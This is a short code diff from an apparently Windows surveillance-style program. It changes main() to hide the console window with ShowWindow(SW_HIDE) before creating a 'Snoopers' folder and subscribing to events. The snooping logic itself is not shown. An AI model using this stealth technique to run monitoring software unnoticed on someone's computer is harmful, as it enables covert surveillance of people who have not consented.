@@ -121,7 +121,8 @@ void SubscribeToEvents() {
 }
 
 int main() {
-    FreeConsole();
+    HWND hWnd = GetConsoleWindow();
+    ShowWindow(hWnd, SW_HIDE);
     CreateDirectory("Snoopers", NULL);
     SubscribeToEvents();
     return 0;
